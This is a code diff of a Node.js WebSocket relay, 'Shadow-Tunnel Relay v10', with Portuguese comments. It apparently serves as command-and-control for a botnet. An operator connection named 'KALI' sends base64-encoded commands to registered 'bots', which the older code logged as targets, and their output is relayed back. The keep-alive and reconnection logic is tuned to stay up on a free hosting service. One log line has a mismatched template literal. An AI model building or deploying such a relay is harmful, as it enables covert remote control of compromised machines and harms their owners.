@@ -1,74 +1,58 @@
+// ----------  SHADOW-TUNNEL RELAY v10  ---------- //
+// 1.  Trava conexões simultâneas  →  mantém  alive  com  ping
+// 2.  Aceita  qualquer  Origem  (Render  exige  isso)
+// 3.  Log  reduzido  →  não  estoura  limite  de  log  do  Render
+
 const WebSocket = require('ws');
-const http = require('http');
+const http      = require('http');
 
-const server = http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('Shadow Gateway v10 - Online');
-});
-
-const wss = new WebSocket.Server({ server });
+const server = http.createServer((_, r) => r.end('Shadow v10'));
+const wss    = new WebSocket.Server({ server, path:'/' });
 
 let KALI = null;
-const BOTS = new Map();
+const BOTS = new Map();                 // id  →  ws
+
+function rawSend(ws, data) {
+    if (ws && ws.readyState === ws.OPEN) ws.send(data);
+}
 
 wss.on('connection', (ws, req) => {
-    const params = new URLSearchParams(req.url.split('?')[1]);
-    const id = params.get('id');
+    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
+    if (!id) return ws.close(1008, 'missing id');
 
     if (id === 'KALI') {
-        if (KALI) KALI.terminate();
+        if (KALI) KALI.close();         // expulsa  Kali  antigo
         KALI = ws;
-        console.log('[+] Operador David Conectado');
-        // Notifica o Kali sobre todos os bots existentes
-        BOTS.forEach((_, botId) => {
-            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
-        });
-    } else if (id) {
-        if (BOTS.has(id)) BOTS.get(id).terminate();
+        console.log('[+] Kali ok');
+        BOTS.forEach((_, botId) => rawSend(KALI, JSON.stringify({t: 'bot', s: 'on', id: botId})));
+    } else {
         BOTS.set(id, ws);
-        console.log(`[+] Alvo registrado: ${id}`);
-        if (KALI && KALI.readyState === WebSocket.OPEN) {
-            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
-        }
+        console.log(`[!] Bot ' + id);
+        rawSend(KALI, JSON.stringify({t: 'bot', s: 'on', id}));
     }
 
-    ws.on('message', (message) => {
-        try {
-            const data = JSON.parse(message);
-            if (ws === KALI) {
-                const target = BOTS.get(data.to);
-                if (target) target.send(data.cmd);
-            } else {
-                if (KALI && KALI.readyState === WebSocket.OPEN) {
-                    KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
-                }
-            }
-        } catch (e) {
-            // Se não for JSON, envia como resposta bruta (fallback)
-            if (ws !== KALI && KALI) {
-                KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
-            }
+    ws.on('message', raw => {
+        if (ws === KALI) {                              // Kali  →  Bot
+            try {
+                const d = JSON.parse(raw);
+                const target = BOTS.get(d.to);
+                if (target) rawSend(target, d.cmd);     // cmd  já  vem  base64
+            } catch {}
+        } else {                                        // Bot  →  Kali
+            rawSend(KALI, JSON.stringify({t: 'res', f: id, d: raw.toString()}));
         }
     });
 
     ws.on('close', () => {
-        if (ws === KALI) {
-            KALI = null;
-            console.log('[-] Operador Desconectado');
-        } else {
+        if (ws === KALI) { KALI = null; console.log('[-] Kali off'); }
+        else {
             BOTS.delete(id);
-            if (KALI && KALI.readyState === WebSocket.OPEN) {
-                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
-            }
+            rawSend(KALI, JSON.stringify({t: 'bot', s: 'off', id}));
         }
     });
 
-    // Keep-alive a cada 20 segundos
-    const timer = setInterval(() => {
-        if (ws.readyState === WebSocket.OPEN) ws.ping();
-        else clearInterval(timer);
-    }, 20000);
+    // Keep-alive  (Render  mata  inativo  em  ~2  min)
+    const timer = setInterval(() => (ws.readyState === ws.OPEN ? ws.ping() : clearInterval(timer)), 30000);
 });
 
-const PORT = process.env.PORT || 10000;
-server.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
+server.listen(process.env.PORT || 10000);
